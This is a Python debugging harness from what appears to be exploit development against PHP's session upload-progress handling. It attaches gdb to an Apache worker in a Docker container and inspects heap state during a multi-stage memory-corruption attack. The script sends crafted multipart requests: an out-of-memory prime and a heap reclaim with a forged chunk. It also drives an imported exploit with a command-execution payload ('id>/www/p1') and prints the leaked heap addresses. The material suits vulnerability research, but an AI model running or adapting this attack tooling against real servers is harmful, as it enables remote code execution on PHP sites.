#!/usr/bin/env python3
"""Runtime heap probe (gdb) for php2shell stage-1 on a p2s container.

Two inspections:
  A) AFTER the OOM prime (A) — one-time: where does PS(id) point, what is
     PS(id)->len / ->val, and the surrounding heap words.
  B) AT cookie-gen during the reclaim (B) — single breakpoint on
     php_url_encode (len in 10..64): PS(id) + PS(id)->val words. This is the
     moment the leak would fire.

Validates the approach on 8.3.35 (leak works) before applying to 8.2.34.

usage: python gdb_heap_probe.py <container> <port> <zif> <dtor>
"""
import sys, os, time, subprocess, tempfile

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import exploit

CONTAINER = sys.argv[1] if len(sys.argv) > 1 else "p2s8234"
PORT      = int(sys.argv[2]) if len(sys.argv) > 2 else 18111
ZIF       = int(sys.argv[3], 0) if len(sys.argv) > 3 else 0x39b8a0
DTOR      = int(sys.argv[4], 0) if len(sys.argv) > 4 else 0x487650
SID       = exploit.SID

def log(m): print(m, flush=True)

def worker_pid():
    out = subprocess.run(
        ["docker", "exec", CONTAINER, "ps", "-eo", "pid,ppid,args"],
        capture_output=True, text=True, timeout=30).stdout
    for line in out.splitlines():
        p = line.split()
        if len(p) >= 3 and "apache" in line:
            if int(p[1]) == 1 and int(p[0]) != 1:
                return int(p[0])
    return None

def send_A(t, ex):
    parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
    parts += [{"name": "PHPSESSID", "data": b"\x00"},
              {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
              ex._file_part(), ex._big_field()]
    t.post(exploit.build_multipart(parts, b"S" * 17), b"S" * 17,
           read_cap=1 << 20, timeout=120)
    time.sleep(0.3)

def send_B(t, ex):
    import struct
    parts = [{"name": "PHPSESSID", "data": SID},
             {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
    for i in range(ex.stage1_n):
        parts.append({"name": str(1000 + i),
                      "data": (f"v{i:04d}" + "x" * 44)[:48].encode()})
    forge = bytearray(b"A" * 79)
    struct.pack_into("<Q", forge, 0x10, 0x1000); forge[0x18] = ord("L")
    parts.append({"name": "1999", "data": bytes(forge)})
    resp = t.post(exploit.build_multipart(parts, b"B" * 10), b"B" * 10,
                  read_cap=9 << 20)
    ck = exploit.parse_cookie(resp)
    log(f"  B: raw={len(resp)}B cookie={len(ck)}B head={ck[:32]!r} "
        f"chunk={exploit.chunk_base_from_cookie(ck) or 0:#x}")
    return resp

# gdb: print PS(id) and heap at a given moment.
# php_ps_globals layout: save_path@0x00, session_name@0x08, id@0x10
INSPECT = r"""
set $psg = (void*)&ps_globals
set $idp = *(void**)((char*)$psg + 0x10)
printf "  PS(id)         = 0x%llx\n", (unsigned long long)$idp
x/6gx $idp
set $len  = *(unsigned long long*)((char*)$idp + 0x10)
set $valp = *(void**)((char*)$idp + 0x18)
printf "  PS(id)->len    = 0x%llx\n", (unsigned long long)$len
printf "  PS(id)->val    = 0x%llx\n", (unsigned long long)$valp
x/8gx $valp
"""

def gdb_after_A(pid):
    cmds = "set pagination off\nset confirm off\n" + INSPECT
    return run_gdb(pid, cmds, tag="AFTER-A")

def gdb_at_cookie(pid):
    cmds = ("set pagination off\nset confirm off\n"
            "b php_url_encode if $rsi >= 10\n"
            "commands\nsilent\n"
            'printf "\\n=== AT COOKIE-GEN ===\\n"\n'
            "printf \"  arg str=0x%llx len=%lld\\n\", "
            "(unsigned long long)$rdi, (long long)$rsi\n"
            + INSPECT +
            "end\ncontinue\n")
    return run_gdb(pid, cmds, tag="AT-COOKIE")

def run_gdb(pid, cmds, tag):
    f = tempfile.NamedTemporaryFile("w", suffix=".gdb", delete=False, dir=".")
    f.write(cmds); f.close()
    local = os.path.abspath(f.name)
    cpath = "/tmp/p.gdb"
    subprocess.run(["docker", "cp", local, f"{CONTAINER}:{cpath}"],
                   capture_output=True, timeout=30)
    p = subprocess.Popen(["docker", "exec", CONTAINER, "gdb", "-q", "-batch",
                          "-p", str(pid), "-x", cpath],
                         stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                         text=True)
    try:
        out, _ = p.communicate(timeout=45)
    except subprocess.TimeoutExpired:
        p.kill(); out = p.stdout.read() if p.stdout else ""
    os.unlink(local)
    log(f"--- gdb [{tag}] ---")
    # filter to the interesting lines
    for line in out.splitlines():
        l = line.strip()
        if any(k in line for k in ("PS(id)", "0x7", "0x5", "->len", "->val",
                                   "arg str", "=== ", "Cannot", "Error",
                                   "No process", "ptrace", "denied")):
            log("   " + line)
    return out

def main():
    t = exploit.Target(f"http://127.0.0.1:{PORT}/", timeout=120, verbose=False)
    ex = exploit.Exploit(t, "id>/www/p1", zif_offset=ZIF, dtor_offset=DTOR,
                         htdata_offset=0x690d8, huge_mb=256, verbose=False,
                         profile="bookworm")
    ex.stage1_n = 841

    log(f"== {CONTAINER}:{PORT} ==")
    log("[1] rotate()"); ex.rotate()
    log("[2] send A (OOM prime)"); send_A(t, ex)
    pid = worker_pid()
    log(f"[3] worker PID = {pid}")
    if not pid:
        log("  !! no worker"); return 1
    log("[4] inspect heap AFTER A")
    gdb_after_A(pid)
    # Re-attach for the cookie-gen breakpoint (worker was detached above).
    log("[5] set cookie-gen breakpoint, then send B")
    # We need gdb attached while B is in flight; do it in one gdb session:
    cmds = ("set pagination off\nset confirm off\n"
            "b php_url_encode if $rsi >= 10\n"
            "commands\nsilent\n"
            'printf "\\n=== AT COOKIE-GEN (B) ===\\n"\n'
            "printf \"  arg str=0x%llx len=%lld\\n\", "
            "(unsigned long long)$rdi, (long long)$rsi\n"
            + INSPECT +
            "end\ncontinue\n")
    f = tempfile.NamedTemporaryFile("w", suffix=".gdb", delete=False, dir=".")
    f.write(cmds); f.close()
    local = os.path.abspath(f.name)
    subprocess.run(["docker", "cp", local, f"{CONTAINER}:/tmp/p.gdb"],
                   capture_output=True, timeout=30)
    gp = subprocess.Popen(["docker", "exec", CONTAINER, "gdb", "-q", "-batch",
                           "-p", str(pid), "-x", "/tmp/p.gdb"],
                          stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                          text=True)
    time.sleep(4)
    log("[6] send B (reclaim)")
    try:
        send_B(t, ex)
    except Exception as e:
        log(f"  B EXC: {type(e).__name__} {e}")
    try:
        out, _ = gp.communicate(timeout=60)
    except subprocess.TimeoutExpired:
        gp.kill()
        try: out = gp.stdout.read()
        except Exception: out = ""
    os.unlink(local)
    log("--- gdb [AT-COOKIE(B)] ---")
    for line in (out or "").splitlines():
        if any(k in line for k in ("PS(id)", "0x7", "0x5", "->len", "->val",
                                   "arg str", "=== ", "Cannot", "Error",
                                   "ptrace", "denied", "Breakpoint")):
            log("   " + line)
    return 0


if __name__ == "__main__":
    sys.exit(main())
